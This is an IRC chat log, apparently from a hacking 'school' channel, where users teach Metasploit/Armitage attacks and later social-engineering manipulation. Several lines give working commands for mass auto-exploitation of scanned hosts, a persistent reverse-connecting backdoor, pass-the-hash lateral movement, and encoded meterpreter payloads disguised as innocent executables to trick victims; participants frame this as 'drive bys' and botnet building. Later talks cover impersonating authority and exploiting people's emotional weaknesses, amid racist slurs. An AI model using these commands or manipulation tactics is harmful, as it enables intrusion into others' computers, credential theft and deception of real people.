22:07 <@JessicaParker> I don't know I've never had the urge to run it in windows.
22:07 <@JessicaParker> yes d1zzY
22:07 <+JackofCoins> kk 
22:08 <+menot> thank you
22:08 <+menot> does somebody know, why ubuntu ~10.10 is not vuln to simple stack exploitation? i compiled a script with gcc -fno-stack-protector and aslr is off
22:08 <@d1zzY> offtopic
22:08 <+JackofCoins> true, continue please I'm now at the armitage window
22:09 <@JessicaParker> Okay well since this is for educational purposes only everyone do the right thing and make sure you have permissions to target your local networks.
22:09 <&Fox> PERMISSION TO DO DRIVE BYS
22:09 <&Fox> BLAT BLAT.
22:10 <+JackofCoins> is the User/Pass the Mysql Root user?
22:11 <@JessicaParker> I don't know i'm doing postgresql and my database is already configured lol
22:11 <@JessicaParker> arp -a | awk -F \( '{print $2}' | awk -F \) '{print $1}'
22:11 <@JessicaParker> hell i'll get fancy with it
22:12 <@JessicaParker> arp -a | awk -F \( '{print $2}' | awk -F \) '{print $1}' | sed -n -e ":a" -e "$ s/\n/ /gp;N;b a"
22:12 <@JessicaParker> copy those IPs
22:12 <@JessicaParker> and do hosts --add (paste the ips)
22:13 <@JessicaParker> inside of armitage
22:13 <@JessicaParker> a list of targets should appear in the window above you
22:14 <@JessicaParker> click on any one of them and hit ctrl + a right click and scan them
22:14 <@JessicaParker> armitage will automatically launch 20 threads for discovering basic exploitable services
22:15 <@JessicaParker> you can check the status of the scan by doing jobs -l -v
22:17 <&Fox> also for any ofthe people i've been tweeting
22:17 <&Fox> holler at me if you're hiding in here
22:17 <@JessicaParker> Hopefully your scans should have completed by now
22:18 <+JackofCoins> Sorry Jessica Im still getting mysql setup ha :\
22:18 <@JessicaParker> db_autopwn -T 25 -e -p -PI 21,22,23,80,135-139,445,1025,1400-1500,3306,64371,62873
22:18 <%FR0STY> me to :(
22:21 <&Fox> JessicaParker: 
22:21 <&Fox> :)
22:21 <&Fox> Just keep goin
22:21 <&Fox> lol
22:21 <@JessicaParker> That db auto pwn will attempt to exploit all boxes that you added with a 25 second delay based on ports (so will try exploits for every operating system)
22:22 <@JessicaParker> Any successful exploits won't be persistent, so it's a good idea to leave some sort of backdoor
22:22 <+JackofCoins> Do you mean it will fill the DB with exploits or attempt to exploit the target computer?
22:22 <@JessicaParker> exploit the target computer
22:22 <@JessicaParker> with every possible thing for those ports
22:22 <&Fox> Also known as
22:22 <&Fox> METASPLOIT DRIVE BY
22:23 <@JessicaParker> This can get rather CPU intensive
22:23 <@JessicaParker> so it's a good idea to renice java and the msfrpcd
22:23 <+L0rd_N1k0n> im sure most these kids parents bought them I9's
22:25 <@JessicaParker> On windows targets it tends to spawn a shell and immediately upgrade to meterpreter
22:26 <@JessicaParker> The windows targets you can usually keep..
22:26 <@JessicaParker> run persistence.rb  -S  -X -i 10 -p 3319 -r somereverseconnectip -A
22:27 <@JessicaParker> That will leave a persistent metsvc that will attempt to connect back to specified ip every 10 seconds and launch as system at boot to look less suspicous
22:29 <&Fox> JessicaParker: has pretty much taught you the art
22:29 <&Fox> of the long-range drive by
22:29 <&Fox> Pick a range
22:29 <&Fox> start getting yourself some dope shit
22:30 <&Fox> Questions?
22:30 < flotsam_jetsum> thnx jessica
22:30 <+lovely> ty jess
22:30 < S4NDALPHON> yes 
22:30 < S4NDALPHON> thx first
22:30 < MadBlackHatter> ty JP
22:30 < L> can someone put the tut on pastebin? i DC'd right as it started
22:30 <&Fox> lolol
22:30 <@d1zzY> lol
22:30 <&Fox> So
22:30 <&Fox> Questions
22:31 <&Fox> or next topic
22:31 <@JessicaParker> not done D=
22:31 < S4NDALPHON> questions
22:31 <@JessicaParker> just making some visual examples
22:31 < beardgf> what is the better way to run metasploit aver TOR?
22:31 < beardgf> *over
22:31 < FoxInSocks13> +m #school
22:31 <@JessicaParker> yes you can use hidden tor services, but it's best just to throw it on a root
22:31 <&Fox> Oh
22:32 <&Fox> sec
22:32 < FoxInSocks13> isit easy to detect?
22:32 <&Fox> There we go
22:32 <&Fox> lol
22:32 <@JessicaParker> http://img193.imageshack.us/img193/2501/take0ver.png
22:32 < FoxInSocks653_> next topic
22:32 <@JessicaParker> Once you've exploited a target
22:32 <@JessicaParker> You'll want to setup a pivot
22:32 <@JessicaParker> This is basically a tunnel 
22:33 <@JessicaParker> that lets you forward traffic through the exploit
22:33 <@JessicaParker> ed host*
22:33 <@JessicaParker> You can do this in the meterpreter sub menu by right clicking on the target host
22:34 <@JessicaParker> You'll probably want to arp scan out everything you can pull from their routing table
22:35 <@JessicaParker> the metasploit framework comes with all sorts of post modules for windows hosts
22:36 <+lucky225> so ne ways
22:36 <@JessicaParker> you can easily dump the password hashes and get an idea of every service running on a compromised host, and you'll want to dump password hashes every single time if possible
22:36 <@JessicaParker> because if someone has the same username and password on the network you're testing
22:36 <@JessicaParker> you can pass the hash without having to crack it and get access to another system
22:37 <@JessicaParker> have a look at $METASPLOITBASEDIR/msf3/scripts/meterpreter/
22:38 <+JackofCoins> How do you turn hashed passwords into rregular text ones?
22:38 <@JessicaParker> you don't you just send the hash directly over smb and you can log in
22:38 <+lucky225> if you want to crack a hash tho you can use rainbow tables
22:39 <&Fox> Message HalfOp or Higher for voice
22:39 <+JackofCoins> wow do hash passwords work on websites etc as well?
22:39 <@JessicaParker> Every one of those scripts in that directory is invoked by typing: run scriptname.rb in a meterpreter session
22:40 <@JessicaParker> jackofcoins Can't say, never tried.
22:40 <+JackofCoins> I see thanks for the info!
22:41 <@JessicaParker> by now the arp scan on the exploited host should have finished for all the netmasks you told it to scan down
22:41 <&Fox> sorry
22:41 <&Fox> wrong chan
22:41 <@JessicaParker> and you can scan any additional computers 
22:41 <@JessicaParker> and attempt to exploit them too
22:41 <@JessicaParker> if you exploit through a pivoted host the green arrow pointing to that one will change to yellow and you repeat the process
22:41 <+JackofCoins> How do you learn the commands for Armitage/Metasploit
22:42 <&Fox> MOST BIG HECKERS USE THIS AS A WAY TO START UP A BOTNET
22:42 <@JessicaParker> metasploit unleashed
22:42 <&Fox> Or get permission
22:42 <@JessicaParker> Is some excellent reading material
22:42 <@JessicaParker> They'll explain how you can get a payload on to just about any file and encode it
22:42 <+Wolfy>  <@JessicaParker> you don't you just send the hash directly over smb and you can log in  <---Could you elaborate further on this part or link me to reference material to understand that further?
22:42 <@JessicaParker> If you don't feel like exploiting a target and would rather just social engineer someone in to opening a file
22:43 <@JessicaParker> msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R | msfencode -t exe -e x86/shikata_ga_nai -c 5 -o ~/payload.exe
22:44 <@JessicaParker> That will encode you a nice little bin that you can trick people in to running
22:44 <@JessicaParker> you can also make php shells and what not for any targets
22:44 <@JessicaParker> k Fox i gotta get back to work lol
22:45 <@JessicaParker> take care all
22:45 <&Fox> np
22:45 <@m4tr1c3s> thanks for sharing your knowledge :3
22:45 <&Fox> Also
22:45 <&Fox> JessicaParker
22:45 <&Fox> =
22:45 <&Fox> Hottie
22:45 < mortisha> hi all
22:45 <&Fox> next time you see 
22:45 <&Fox> PM for hot sex.
22:45 <&Fox> just letting you all know
22:46 <&Fox> protip
22:46 < Smokey024> LOL
22:46 <&Fox> Anyways
22:46 < Korrupt> lol
22:46 < flotsam_jetsum> gotta run thnx guys
22:46 < DaemonX> lol
22:46 <@kratos> https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html
22:46 <@kratos> Wolfy: 
22:46 <&Fox> I need a cigarette, but you all got some questions kids?
22:46 <+Wolfy> Thank you kratos  <3
22:46 <@kratos> np
22:46 < cjisagay> do you think it would be successfull to run this on a rented vps or dedicated server?
22:46 < S4NDALPHON> thx
22:46 < Korrupt> so i am new here do we just talk about hacking or does someone kinda lecture?
22:46 <@kratos> also, to answer the earlier question - you won't be able to use the hash outside windows systems
22:46 < Gunzer> cjisagay: Depends on where the server is
22:46 <@kratos> NTLM hashes are windows-specific
22:47 < MacGyver_AFK> whats cr4acken
22:47 <+lovely> :)
22:47 < S4NDALPHON> does anyone knows if this means i was successfull : http://paste2.org/p/1577119
22:47 < mortisha> What do you use as a reverse IP ? Obv you dont want to disclose your real ip 
22:47 < S4NDALPHON> ?
22:47 <@kratos> used for authentication to the OS
22:47 < FoxInSocks737_> asd
22:47 <@kratos> ie. you can't just drop it into a php script on a forum or something
22:47 <@kratos> besides, most websites and programs will not accept a hash in lieu of a password and will try to hash any hash provided
22:47 < Tweak_> hey fox, care to jump into my suggestion?
22:47 < FoxInSocks921> whats your fav php shell ATM?
22:47 < Hit_X> need voice in here?
22:47 < illuminati> hi
22:47 < mortisha> S4NDALPHON: no it's not. 
22:48 <&Fox> Tweak_: here in a minute
22:48 <&Fox> I really need to have a cigarette
22:48 <&Fox> and piss
22:48 < Tweak_> thanks
22:48 <&Fox> keep talking
22:48 < captainkurt> got a pw for one of my accs (sql i think) and cant rem. c&a cant crack HLP:(
22:48 <&Fox> Also
22:48 <&Fox> protip
22:48 < Gunzer> mortisha: use a free AWS instance
22:48 <&Fox> OpFacebook = Honeypot
22:48 < MacGyverr> hows class going fox
22:48 <&Fox> Defcon Confirmed.
22:48 <&Fox> MacGyverr: Check usercount ;)
22:48 < mortisha> what's not a honeypot actually ? :)
22:48 < n3xusz> mm
22:48 < S4NDALPHON> mortisha: ok, any hints about why that "pipe" thing was broken ?
22:48 <@kratos> Fox: you hear that all defcon networks were comped?
22:48 <%McGarnigle> I like doing this: ./msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R | ./msfencode -t exe -e x86/shikata_ga_nai -c 5 -x EXE-template/innocent.exe -o our-encoded-payload-w-template.exe
22:48 <&Fox> kratos: thats already assumed
22:49 <@kratos> yeah
22:49 <@kratos> but i mean
22:49 <@kratos> apparently it was proven
22:49 <@kratos> all the networks in the area
22:49 < taru> lol
22:49 <@kratos> literally
22:49 < captainkurt> hav hash
22:49 <@kratos> rootkits rootkits everywhere
22:49 <&Fox> kratos: thats already assumed.
22:49 <&Fox> lol
22:49 <@kratos> android phones gone mad
22:49 <@kratos> lol
22:49 < mortisha> S4NDALPHON: try update your msf install
22:49 < mortisha> I assume you ran it as root/sudoer right ?
22:50 < Korrupt> what db do you guys use for msf?
22:50 < S4NDALPHON> mortisha, yes, armitage was running sudo
22:50 < FoxInSocks921> postgres
22:50 <&Fox> cigarette
22:50 < Korrupt> isnt postgres a hassle to set up tho?
22:50 <+MrWonderful> if youre completely lost. you are not alone =)
22:50 < FoxInSocks921> fuck yeah
22:50 <&Fox> mods are away post 0day
22:50 < mortisha> S4NDALPHON: upgrade then, black magic
22:50 <&Fox> oh wait, you all dont have any
22:50 <&Fox> lololol
22:50 < FoxInSocks674> im new to school
22:50 < FoxInSocks745> nope
22:50 < cjisagay> has anyone run this on a vps?
22:51 <&Fox> also defcon CD = almost ready for uploaded
22:51 < mortisha> Fox: i can sell you some 0d
22:51 <@kratos> ooh
22:51 <@kratos> defcon cd?
22:51 < Smokey024> fox im leaving work soon, you gonna post the link some where else?
22:51 <&Fox> Yep
22:51 < MadBlackHatter> What are the general contents of the Defcon CD?
22:51 <&Fox> Links going up
22:52 <@kratos> is it just a bunch of laem perl scripts for lusers? lol
22:52 < captainkurt> 8w+7Ou6X49KpFTgSFoyqZg==   
22:52 < FoxInSocks664> Hi guys there
22:52 < RichyB> dont know if anyone is interested but i hve the 5 disk from ceh v7 course?
22:52 <&Fox> CEH is a dirty word here.
22:52 < captainkurt> yep
22:52 < RichyB> lol it maybe but i still have them
22:52 < pincode> Fox, reason being?
22:52 <@kratos> urgh

22:52 <@kratos> so many joins/parts
22:53 <%McGarnigle> RichyB: http://www.filestube.com/search.html?q=CEH
22:53 <&Fox> Fuck CEH
22:53 <@kratos> ceh isn't all bad
22:53 <@kratos> it's like
22:53 <@kratos> the a+ of hakking
22:53 <@kratos> haha
22:53 < RichyB> it is
22:53 < Korrupt> is there a website for this community?
22:53 < RichyB> and it was
22:53 <@kratos> ...
22:53 < mortisha> S4NDALPHON: any dep can be broken so yes, try an "apt-get upgrade msf" to start
22:54 < menot> isnt postgre included to msf?
22:54 < mortisha> no
22:54 < menot> wont startup here...
22:54 < RichyB> its included on backtrack
22:54 < mortisha> btw u need the ruby gem + postgresql 
22:55 <@kratos> that's really annoying
22:55 < Smokey024> fox where ya be posting the link for cd download?
22:55 < menot> what is rubygem for?
22:55 < illuminati> when will the backtrack r1 release??
22:55 < menot> more libs?
22:55 <@m4tr1c3s> lol
22:55 < birra> hi

22:57 < Korrupt> im out ill catch ya guys later i like this channel 
22:57 < th3j35t3r> sabu's bots are being demolished
22:57 < NorberArg> Want to learn some hacking
22:57 < menot> ouch
22:57 < NorberArg> Did u have some manual in spanish to get some info?
22:57 < MadBlackHatter> lulz
22:57 <@kratos> lol
22:57 < NorberArg> xD
22:57 <@m4tr1c3s> they can always rejoin

22:57 <@m4tr1c3s> if they actually want to listen
22:57 < NorberArg> Cause i want to learn some to opfacebook
22:57 <%McGarnigle> they followed sabus web irc client link
22:57 <@m4tr1c3s> yeah
22:57 <@m4tr1c3s> they did
22:58 < menot> what will be the next topic btw?
22:59 <&Fox> Ok
22:59 <&Fox> sec
22:59 <&Fox> back
22:59 < Daemon_X> NorberArg, here some spanish info
22:59 < Daemon_X> http://www.metasploit-es.com.ar/wiki/index.php/Curso_de_Metasploit_Unleashed_en_Espa%C3%B1ol
22:59 < NorberArg> Ok ty dude
22:59 <&Fox> Ok kids
22:59 <&Fox> you all ready?
22:59 <@m4tr1c3s> FUCK YEAH
23:00 < mortisha> What do you use as a reverse IP to meterpreter or any other reverse connect ? 
23:00 <@kratos> fire broadsides
23:00 < Smokey024> im rdy to get this cd, get home n smoke a blunt looking through it
23:00 <@m4tr1c3s> I want to have more learn.
23:00 <&Fox> Ok we're doing some open forum
23:00 <&Fox> sup sup
23:00 < illuminati> where would i be able to get this defcon cd
23:00 < zero> hey
23:00 < Tweak_> open forum = ask any question corect
23:00 < vopperough> do i need to know anything if i want to start hacking?
23:00 <@m4tr1c3s> illuminati, is it the one with all the pdfs?
23:01 <&Fox> Ok
23:01 <&Fox> The Defcon CD
23:01 <&Fox> will be when I get it uploaded
23:01 < Tronix85> Hi all
23:02 <@xo> vopperough: can you use a keyboard?
23:02 <@xo> can u connect to the internet
23:02 <@xo> lol
23:02 < mio> which are these open forums and pdfs
23:02 < vopperough> XD
23:02 < jakwnd> where will you upload it?
23:02 < Tweak_> when you know SSL/SSH is open on a network, how far can you drill into that bitch for data? both inside the network and outside the network. Also, what methods would you use to exploit SSL/SSH if possible
23:02 < vopperough> i mean do i need any basic programming knowledge or such
23:02 <@m4tr1c3s> lol i have 25 mb free
23:03 <@m4tr1c3s> on my hd
23:03 <@xo> vopperough: no, but you should learn how to program
23:03 <@xo> lol
23:03 < mortisha> Tweak_: inside network you can maybe mitm some ssh connection 
23:03 < ap0x> how ar you even on the internet with 25mb free? >_<
23:03 < mortisha> at least if the man is dumb enough to continue connection with the key alert message
23:03 < menot> vopperough, no but then you are a skid
23:03 < notPanda> What are some good "into to hacking" guides?
23:03 <&Fox> the shit in the topic
23:03 <&Fox> faggot
23:03 < vopperough> @xo im learning that
23:03 < notPanda> i can follow the gist of most of these, but don't have the technical skills yet to impliment them :/
23:03 < kwelie> Will the defcon CD be open for donwload or is it only distributed to some people?
23:03 <&Fox> at notPanda

23:16 < YourMomWentToCollege> Does anyone have a guide to fingerprinting hashes? To determine what possible algorithm was used to generate the hash.
23:17 < menot> what does "org.xml.sax.SAXParseException:Content is now allowed in prolog" mean?
23:17 <@kratos> YourMomWentToCollege: look up examples of /etc/passwd files and databases with different hashing methods
23:17 < Freakadelle> does anybody got a guide for opfacebook? (;
23:17 <@kratos> best way is to learn through example
23:17 < YourMomWentToCollege> kratos: that's what I've been doing, but it's annoying
23:17 < L> opfacebook is bullshit afaik
23:18 <@kratos> i don't think there's any '1 guide to rule them all' thing

23:42 <%impact> thank you Fox
23:42 <+YmxldnB4> cst is utc - 6, so 6am UTC is when they stop
23:42 <%impact> the lesson is the first lesson out of the training of intelligence agents
23:43 <%impact> it is; establish things, trust
23:43 <%impact> the way of achieving goals inside intelligences is by going down these steps with every contact you make;
23:44 <%impact> contact person, create trust, create a relation, gather information, analyze information
23:44 <%impact> the very first thing one needs to know about getting in contact with any person is
23:45 <%impact> whatch the person
23:45 <&Fox> Someone unban everyone.
23:45 <%impact> you will reckognize a lot of positive and negative attributes of a person
23:46 <%impact> they will sum up to you persona and behavior to this contact person
23:46 <+sharpie> you sure fox?
23:46 <&Fox> Yes
23:46 <+sharpie> !clear bans
23:46 <@sharpie> !clear bans
23:46 <%impact> control yourself and filter off any negative attributes of a contact person
23:46 <@sharpie> ahh
23:46 <@sharpie> lol
23:46 <@kratos> lol
23:46 <@sharpie> no bot
23:46 <@kratos> there's like
23:46 <@kratos> 30 of them
23:46 <@kratos> lol
23:46 <&Fox> Unban. All.
23:46 <%impact> you mind will become your persona, turn negative thoughts into positive ones
23:47 <@kratos> unban everything?
23:47 <@sharpie> that's all
23:47 <@m4tr1c3s> it's do ne
23:47 <@m4tr1c3s> do
23:47 <@m4tr1c3s> unban all
23:47 <%impact> and persons you want to have contact with will like you and share with you
23:47 <@m4tr1c3s> done
23:47 <@kratos> ok
23:47 <@sharpie> there were onl 3
23:48 <%impact> set aside you personality, become a new one by removing negative thoughts about your target
23:48 <@sharpie> lol I see what happened
23:48 <@sharpie> hehe
23:49 <+YmxldnB4> now it's all quiet
23:49 <&Fox> What 
23:49 <&Fox> GODDAMN
23:49 <+YmxldnB4> yes, netsplit

23:50 < Am0s> yayyy netsplit
23:50 < Shaggy> k 
23:50 < FoxInSocks168> hey , here where we can learn about security and hack?
23:50 <&Fox> STOP THAT 
23:50 < Shaggy> http://www.social-engineer.org/ read up!
23:50 <&Fox> Where is hadnagy
23:50 <&Fox> someone get at him
23:50 < Backslash> Op Fox? :-)
23:51 < Shaggy> and like i said before, a good way to SE someone is to find they voulnerbilitys
23:51 < nbogdan> What?
23:51 <@Backslash> <3
23:51 < nbogdan> It is time to learn stuff?
23:51 < Shaggy> like if they got out of a bad realtionship blah blah
23:51 < FoxInSocks168> I'm ready for this
23:51 < Shaggy> act like you care and be for them, instant brain access
23:51 <&Fox> STOP THAT ANONOPS
23:52 < menot> -.-
23:52 < Shaggy> been doing so for my whole life
23:52 <&Fox> Ok
23:52 <&Fox> so
23:52 <+YmxldnB4> it does that constantly
23:52 <&Fox> We're finishing up this talk
23:52 <@m4tr1c3s> lol
23:52 <+turbopinko> what is the talk now
23:52 <@m4tr1c3s> i'm ready to cotinue :)
23:52 <@m4tr1c3s> sandstone wanted to talk
23:53 <%impact> hey, i gotta finish mine first
23:53 <+sandstone> I've got a bit on using authority in social engineering
23:53 <+YmxldnB4> people are still rejoining
23:53 <@m4tr1c3s> ofc go on
23:53 <&Fox> Obviously
23:53 <+sandstone> have at it impact
23:53 <%impact> okay, so whatch yourself and behaviour against others
23:53 <%impact> set aside bad thoughts, control your personality
23:54 <%impact> become invisible for empathic people
23:54 <%impact> and of course and allways, over all lessons; DO NOT TRUST
23:54 <%impact> TRUST kills people
23:54 <%impact> if you live in a regime
23:55 <%impact> and you are betrayed, it is bacause you have trusted
23:55 <%impact> if you are living in Iran or Syria or else
23:55 <%impact> do NOT TRUST anyone
23:55 <%impact> stay beneath the radar
23:55 <%impact> it will keep you alive
23:55 <%impact> lesson over, thank you
23:56 <%impact> any questions?
23:56 < Shaggy> yes
23:56 < nbogdan> Thank you wise one.
23:56 < Shaggy> nevermind
23:56 < nbogdan> Wow net split....

23:56 < MadBlackHatter> netsplit?
23:56 <+turbopinko> african or european?
23:56 <@m4tr1c3s> even if it's not directly related to leet haxxoring, that is sage wisdom
23:56 < Shaggy> but i think you should give links for reffrece
23:56 <&Fox> Damndude
23:56 < Shaggy> maybe some psychology books
23:57 <&Fox> we're just bleeding after this netsplit
23:57 < zeitgh0st> turbopinko: I...I don't know...
23:57 < zeitgh0st> AAAAAARGGGGGGGGGGGG
23:57 < DIZ[A]STER> jesus
23:57 < orez> and thats what happens when i say "huge netsplit"
23:57 < faith> net split is getting an habit lately
23:57 < MadBlackHatter> nvm.
23:57 <+turbopinko> well if he grips by the husk....
23:57 <@m4tr1c3s> are questions for impact done?
23:57 < FoxInSocks889> anyone here from portuguese anonymous?
23:57 < Shaggy> http://www.social-engineer.org/
23:57 < Egel> what about NLP?
23:57 <&Fox> Yeah I think so
23:57 <@m4tr1c3s> ok
23:57 < nbogdan> Of what is that?
23:57 <@m4tr1c3s> sandstone, your time to chine
23:57 < Shaggy> http://www.symantec.com/connect/articles/social-engineering-fundamentals-part-i-hacker-tactics
23:57 <%impact> it was just lesson one
23:58 <@m4tr1c3s> and shine, that too
23:58 <%impact> whatch yourself the next week, make a lot of contacts

23:58 <+phed> cheers mate
23:58 <@m4tr1c3s> hey hatter
23:58 <+phed> wb hatter :)
23:59 <@m4tr1c3s> ok, sandstone. go!
23:59 <+sandstone> so: authority in social engineering
23:59 <+sandstone> everyone has probably heard of it or thought about doing it, "oh I'm with the fbi"
23:59 <&Fox> my god
23:59 <+sandstone> even for people that don't question authority aren't going to just take something at face value

00:00 <+sandstone> to prevent conflicts to your imaginary authority, you need to define first that you have it
00:00 <+sandstone> and then, specifically, do not threaten to impose it it anyway
00:00 <+JackofCoins> does this mean the irc servers being hacked? lol
00:00 <+sandstone> if you claim to be a cop, don't threaten to arrest someone
00:00 <+turbopinko> nope means they are irc servers
00:00 <+sandstone> if you claim to be leading an environmentalist group, do not threaten to launch a protest
00:01 <+sandstone> as soon as you begin threatening to impose your authority on someone, they begin to question it and become concerned, which leads to more and more questions
00:01 <+YmxldnB4> JackofCoins: no, just the admins screwing up
00:01 <+sandstone> when most people think of impersonating an authority figure, they automatically assume some form of LEO
00:01 <+sandstone> this is really, really limiting
00:02 <+sandstone> depending on the situation, you may have better luck by posing as a congressional aid
00:02 <+sandstone> or a regional manager for a store
00:03 <+sandstone> as an added advantage to choosing a less conventional authority figure, there are less pre-formed ideas in peoples minds of what those people are
00:03 <+sandstone> if you are tattooed and have facial hair, most will question you claiming you are an fbi officer
00:03 <+sandstone> they would not be so surprised to learn you were some sort of powerful activist
00:03 <+Kayel> I disagree on the facial hair thing
00:04 <+Kayel> Most presume that all feds are baby-butt-faced
00:04 <+sandstone> Thats what I said?
00:04 <+Kayel> In order for 'em to blend in, they grow hair, facial hair, or apply them
00:04 <+Kayel> Oh, sorry :)
00:04 <+sandstone> Np
00:04 <&Fox> I got dapped by 4 known feds at defcon
00:04 <&Fox> they look just like everyone else
00:05 <+sandstone> The truth and peoples prejudices are not the same
00:05 <+sandstone> When you are manipulating people, it pays to play into their stereotypes
00:05 <+turbopinko> fox: cause everyone there was a fed
00:05 <@m4tr1c3s> lol
00:05 <@sharpie> yeah he's teaching how to use those preconceived ideas
00:05 <&Fox> Fuck
00:05 <&Fox> Who just PMd me
00:05 <&Fox> about 20 lessons
00:05 <&Fox> re-pm
00:06 <+sandstone> The inverse to this is manipulating others that wish to impose their 'authority' on you
00:06 <+sandstone> The easiest way to make them comfortable with you is to be as submissive as possible, do not give them something to butt against
00:06 <+sandstone> When a cop pulls you over, you turn on the overhead light and place your hands on the wheel
00:06 <+sandstone> It makes them comfortable, and they feel in control, and more likely to be nicer to you
00:07 <+sandstone> When trying to persuade someone above you that disagrees with your ideas
00:07 <+sandstone> The biggest lesson I can give is to attack your own point
00:07 <+sandstone> If someone is on the fence about an idea, and is being contrarian about the whole matter as most people will be
00:08 <+sandstone> You attacking a point will cause them to defend it
00:08 <+sandstone> Lets say your boss is on the fence about hiring a consulting agency
00:08 <+sandstone> You are against it, he is on the fence but overall for it
00:08 <+sandstone> If you begin describing everything that makes it a bad idea, you provide something for your boss to push against
00:09 <+sandstone> "They could run away with our data"
00:09 <+sandstone> "No, no, they are bonded and blah blah"
00:09 <+sandstone> Approach it another way, defend them, and it's an amazing thing: they start attacking it
00:09 <+Kayel> Nice point
00:10 <+sandstone> "He has 5 years of experience"
00:10 <+sandstone> "Ehh that seems a bit short"
00:10 <+sandstone> When you are dealing with an authority figure that is being argumentative, give him things to argue against that benefit you
00:10 <+sandstone> questions?
00:11 < Shaggy> nigga speaks with mad experience lol
00:11 < Shaggy> but all true
00:11 < Iain> doesn't really work if you're dealing with someone who actually has an opinion about something
00:11 < FoxInSocks807> i want to be anonymous
00:11 < bombolo> hello world!
00:11 < orez> well said sandstone
00:11  * Datashadow facepalms
00:11 < FoxInSocks807> how can i do that , hi bombolo
00:11 < lucky225> re: looking the part & spotting people trying to; You can spot feds often trying to blend in simply by being observant, shoes are usually a tall tale teller.  If they're wearing a tshirt and jeans but have on dress shoes, what's that tell you?  Military boots, stuff like that can give you a hint at stuff
00:11 < peaceChic> @Defender not sure how to find the CTCP version...researching, unfamiliar with term
00:11 <+sandstone> Iain: opinions are dropped instantly and cheaply when approached properly
00:11 < Egel> what about mirroring? 
00:11 < tuiz> well, if you alway agree with someone (example boss) wont the discussion be over in, well, like under 10 seconds?
00:12 < FoxInSocks179> what is this school about
00:12 <+YmxldnB4> noo anonops, fuck you
00:12 <&Fox> Oh they also love those nylon military pants
00:12 < Iain> tuiz yea, just find yourself a boxx you agree with most of the time :)
00:12 < FoxInSocks807> Same question Fox
00:12 <+sandstone> tuiz: Not usually, any large decision (the only ones you ought to care about) will usually require multiple layers of input and red tape
00:12 < bombolo> what's news? 
00:12 <+sandstone> tuiz: Even when dealing with individual people, you can use it to your advantage, as an example:
00:13 <+sandstone> lets say you are trying to get your buddy to break up with his girlfriend because you are a hater
00:13 < rath> lfucking netsplits
00:13 <+sandstone> when he complains about her: defend what she is doing
00:13 < FoxInSocks179> how does one learn how to be a hacker without stepping on a website that would flag the authorities and make them watch you.
00:13 < Shaggy> So for an example, how do i get my GF to stop starting fights with me?
00:13 < fingerfuck> this is a terrible etalk
00:13 < FoxInSocks807> I live in Brazil , where i can learn that?
00:13 < Shaggy> anyone care to give the answer?
00:13 <+sandstone> "dude she looked through my phone" "well you are being pretty suspicious"
00:13 <+YmxldnB4> Shaggy: break up?
00:13 < Iain> Shaggy punch yourself in the face
00:13 < FoxInSocks807> I speak english 
00:13 <+YmxldnB4> Shaggy: give her less reason to?
00:13 < Daemon_X> sandstone, what about when you are ok with everything and still they are trying to push
00:13 < FoxInSocks642> #FoxInSocks179# - VM your test setup
00:14 <+Kayel> @FoxinSox: Buy a VPN 1st, then start searching for hacking lessons
00:14 <+sandstone> daemon_x: could you rephrase that?
00:14 < Shaggy> no, you always be submissive
00:14 < Shaggy> so she get's no fun out of arguing
00:14 <+YmxldnB4> FoxInSocks179: use Tor or i2p and use it that way
00:14 < Shaggy> fucking morons don't know the first thing about a relationship ahahaha
00:14 < SeaDog> stop arguing and teach already.
00:14 <+sandstone> shaggy: fights in relationships are caused by deeper issues, but triggered by surface issues
00:14 < Datashadow> lol
00:14 < SeaDog> plz?
00:14 <+sandstone> shaggy: don't leave clothes and shit around
00:14 <%n0xmnky> perferably a vpn in a country that does not play well with the US
00:15 < cl1mb1ng> did anyone save the metasploit earlier convo I  lost thread with server hiccup
00:15 < Iain> sandstone I always find in discussions that you should always assume what you're saying is wrong
00:15 < FoxInSocks807> I WANT TO BE ANONYMOUS , I WANT TO LEARN SCHOOLING , HACKING TEST , SECURITY INTERNET , ALL ABOUT THEN
00:15 < Iain> sounds odd...
00:15 <+Kayel> Which countries don't play well with the US?
00:15 < derpfish> FoxInSocks807: I AM HAPPY FOR YOU
00:15 < Iain> but makes you really think about it
00:15 < Datashadow> 807: join #opnewblood
00:15 < Shaggy> join #kill
00:15 < Datashadow> ^ that too
00:15 < SeaDog> metasploit? cl1mb1ng there is a free wiki from the offsec fags
00:15 < peaceChic> @Iain hahahaha
00:15 <+Kayel> Do NOT join #kill!
00:15 < FoxInSocks742> i wonder how many people in here are feds?
00:15 < procrock> sandstone: youre right. They got triggerd by surface issues
00:15 < Shaggy> yes and she displaces her anger
00:16 < th30n3> are we in intermission?
00:16 < Shaggy> so in term of SE'ing
00:16 <@sharpie> Shaggy: not here
00:16 < FoxInSocks179> is there a good place to go to learn how to hack once I have a i2p
00:16 < Daemon_X> for exaple, let's say my boss hire a consultant and I agree but, he is messing with data that he is not suppossed to and the boss still pushing to do it, and no one is acting suspicious
00:16 <+sandstone> iain: keep in mind most people are not that reasonable, those that are can be convinced by logic and reason
00:16 < cl1mb1ng> thanks sea dog
00:16 < NorberArg> Fox why do you kick me before?
00:16 < Shaggy> you need to stay with the relationship
00:16 < FakeBook> more lessons @ join #lulzsec
00:16 <&Fox> Fucking
00:16 <&Fox> niggers
00:16 < Iain> sandstone yeah I agree, that's what happens most of the time for me :P
00:16 < r00t00r> ^
00:16 < SeaDog> yeah, cl1mb1ng : http://www.offensive-security.com/metasploit-unleashed/Metasploit_Unleashed_Information_Security_Training
00:16 < Shaggy> so bst bet is to be submissive and try to figure out why she is snapping
00:16 < derpfish> FoxInSocks179: For web apps, hackthissite.org is decent, Google Gruyere is nice too. For memory corruption stuff, smashthestack.org. For remote exploits, pulltheplug.org
00:16 < Shaggy> maybe she's the prex's daughter ;)
00:16 <+sandstone> daemon_x: if agreeing with him and providing a surface to attack isn't working, become a bit more passive aggressive
00:16 < derpfish> FoxInSocks179: Join every CTF competition you can find
00:16 < NorberArg> Pls dont kick me Fox im just listening at sandstone lessons
00:17 <&Fox> retards.
00:17 < peaceChic> brb, ya'll don't log me out...just gotta pee
00:17 < Datashadow> xD
00:17 < Shaggy> and yo need that relationship
00:17 < FoxInSocks179> what is a CTF competition
00:17 < lucky225> Daemon: confront your boss with something else, talk about how insecure database is and it's good we got a consultant looking at it instead of some hacker, amirite?
00:17 < SeaDog> lol!
